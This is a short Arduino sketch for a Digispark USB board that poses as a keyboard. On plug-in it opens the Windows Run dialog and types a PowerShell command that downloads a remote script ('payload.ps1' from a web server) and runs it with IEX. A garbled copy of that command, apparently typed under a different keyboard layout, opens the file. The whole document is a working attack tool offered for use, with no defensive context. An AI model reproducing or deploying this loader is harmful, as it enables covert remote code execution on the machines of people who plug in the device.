RRPOWERSHELL ÏEX )NEW?OBJECT NET:WEBCLIENT=:DOWNLOADSTRING)¨HTTPSÑ__MYWEBSERVER_PAYLOAD:PS!¨=Ñ
¨
// This script downloads and executes a powershell script.This tab open so quick about 3 seconds.


#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
